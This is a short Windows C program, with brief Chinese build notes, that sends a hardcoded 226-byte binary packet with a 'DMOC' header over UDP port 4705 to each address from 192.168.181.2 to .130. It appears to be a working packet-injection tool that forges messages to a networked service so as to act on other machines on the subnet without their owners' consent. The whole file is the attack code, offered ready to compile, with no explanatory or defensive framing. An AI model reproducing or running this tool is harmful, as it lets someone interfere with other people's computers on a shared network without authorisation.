//编译前在 项目 - 属性 - 链接器 - 输入 - 附加依赖项 中加入ws2_32.lib 
//在不同机器上使用时应先调用cmd中的ipconfig命令获取本机ip地址 

#include <windows.h>
#include <winsock.h>
void win(char *l)
{
	WSADATA w;
	WSAStartup(MAKEWORD(1,1),&w);
	SOCKET c=socket(2,2,0);
	SOCKADDR_IN s;
	s.sin_addr.S_un.S_addr=inet_addr(l);
	s.sin_family=2;
	s.sin_port=htons(4705);
	char a[226] = { 0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0xc6,0x00,0x00,0x00,0x41,0xe2,0xe9,0x39,\
					0x5a,0xa3,0x0b,0x44,0x94,0xbd,0x7b,0xcc,0xf2,0x95,0x0d,0xe8,0x20,0x4e,0x00,0x00,\
					0xc0,0xa8,0x50,0x01,0xb9,0x00,0x00,0x00,0xb9,0x00,0x00,0x00,0x01,0x00,0x00,0x00,\
					0x04,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,\
					0xe1,0x02,0x03,0x0b,0xa6,0x17,0xe1,0x02,0x03,0x0c,0xa9,0x17,0x01,0x00,0x11,0x2b,\
					0x00,0x00,0x10,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x5e,0x01,0x00,0x00,\
					0x31,0x00,0x31,0x00,0x02,0x00,0x00,0x00,0x00,0x50,0x00,0x00,0xa0,0x05,0x00,0x00,\
					0x01,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0x4b,0x00,0x00,0x00,0x00,0x00,0x00,0x00,\
					0xc0,0xa8,0x50,0x01,0x04,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x10,0x00,0x00,0x00,\
					0x00,0x00,0x00,0x00,0x20,0x03,0xe0,0x01};
	a[216]=1;a[19]=GetTickCount();
	sendto(c,a,226,0,(SOCKADDR*)&s,sizeof(SOCKADDR));
	closesocket(c);
	WSACleanup();
}
int main()
{
	char a[99],b[9];
	for(int i=2;i<=130;i++)
	{
		strcpy(a,"192.168.181.");
		itoa(i,b,10);
		strcat(a,b);
		win(a);
	}
}
